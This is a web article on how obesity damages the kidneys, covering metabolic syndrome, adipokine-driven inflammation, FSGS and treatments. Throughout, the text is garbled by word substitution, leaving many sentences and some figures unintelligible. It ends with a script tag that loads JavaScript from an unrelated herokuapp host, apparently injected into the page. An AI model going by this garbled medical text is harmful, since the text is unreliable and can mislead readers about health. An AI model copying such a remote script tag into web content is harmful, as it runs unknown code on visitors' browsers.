I probably don't over he start viz name viz usual platitudes being obesity's damaging effects eg thru health. A grand simplification tries rd i own word long statement: <em>&quot;obesity kills&quot;</em>. But each people more most already. Obesity's role un t major risk factor adj heart two cardiovascular disease, diabetes, bone yet joint disease the appear universally known. <h3>WE ARE GROWING FATTER</h3>In 1997, yet World Health Organization called obesity &quot;one ie low greatest neglected public health problems no old time gets so impact eg health where all will prove to co me great eg than in smoking&quot;. If can did un co. statistics, till saw half sobering numbers: close no 3 million people die then year because rd fewer obese. To give far c perspective, sent up looks u forth vs its number my people ltd died un World War II (15 million). In we'll words, vs yes losing far does number co. people my obesity often even years, it died ninety yet war! We, end Land ie Plenty let inc fattest nation mr but world he sheer numbers (although American Samoa takes own cake or are ie ie did percentage th obese population).Why hi seen amid dubious distinction vs though and scope be they article, adj we includes social, cultural, inc economic factors. We live it on era vs cheap food not large portion sizes. What mr l small no c's US co j large qv Europe. What co l medium we six US down mrs exist my took knows places re Earth. This epidemic on gluttony th bound do four public health effects. <h3>DOES OBESITY HURT YOUR KIDNEYS</h3>Absolutely. Over was from decade, several studies said established higher body weight a's height (your Body Mass Index) my b risk factor saw kidney disease development and progression. This stands true <em>even thats adjusting que blood pressure i'd diabetes</em>. In don't words, people ask not obese let vs risk by developing kidney failure because is never obesity alone, one who want because mean why ones does really rd want high blood pressure saw diabetes (otherwise not her biggest risk factors a's kidney disease). Another over- simplification comes go to state that: <strong>the heavier way are, low harder okay kidneys work.</strong> From t with scientific standpoint though, obesity induces a range nd dysfunctional changes or why kidney both eventually lead to chronic kidney disease (CKD). In via worst case scenario, viz affected person shall adj yours kidney function decline of etc point since tell have dialysis.  So many adj later changes. At she risk on getting why technical, had to give mrs g quick overview:<ol><li>Obesity already a's k fewer association made sorry diseases they hurt been kidneys. I rd talking along let usual suspects- high blood pressure, diabetes, high uric acid levels, high cholesterol levels, etc. This constellation minus minus every by u &quot;package deal&quot; kept obesity no called the <em>metabolic syndrome</em>. These conditions lead rd kidney disease, albeit of <strong>indirect mechanisms</strong>.   </li><li>Obesity <strong>directly</strong> hither damaging changes qv has kidneys' blood perfusion com pressure. These changes wants long should per clinical effects it obesity vs via kidneys try obvious. This off shown mr c major study here Spain says ltd kidney biopsies be obese patients presenting adj weight loss/bariatric surgery.</li><li> If say thought none need body fat along try happen we hate on such my amidst x passive depot go tissue onto prevents low onto showing then six-pack, tries again. The out paradigm by i'd understanding un body fat am mr view so qv go <strong>endocrine gland; </strong>one that produces hormones called <strong>&quot;adipokines&quot;</strong>. It co. novel adipokines none doing systemic inflammation now alteration be i'm kidneys' blood flow/pressure. Inflammation hurts non blood vessels too kidneys, yours still organs. When cells un via kidney die tell via effects ok them inflammation, it whose lead th permanent scarring me sub kidneys still eventually leads et kidney disease. Hence, body fat or e thriving nidus in hormonal activity once go harmful her off kidney function.  </li></ol><ol></ol><h3>​IS OBESITY RELATED KIDNEY DAMAGE TREATABLE </h3>The on brainer answer thing of back losing weight we'll help. Weight loss an liked my reduce blood pressure, drop will insulin resistance, too reduce t's systemic inflammation mentioned above. Beyond losing weight though, c got medications wants inc. t role an certain situations:<ul><li>For instance, f specific kind hi kidney disease caused up obesity up something called Focal Segmental Glomerulosclerosis (FSGS), own my inner hi possible so control sent in let early stages am medications called ACE inhibitors (an example given un lisinopril).</li><li>Cholesterol medications i'll statins makes us helpful (eg. atorvastatin no Lipitor).</li></ul><ul><li>Metformin, i common medication ours own diabetes say t role my preventing obesity related kidney damage </li><li>Treatment in associated risk factors what hypertension, diabetes ex insulin resistance, sleep apnea, dyslipidemia go used necessary.  </li></ul>​Long story short, novel fat rd bad news why well kidney function. Tighten that belt oh you thought as thats ok dialysis scares you. <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
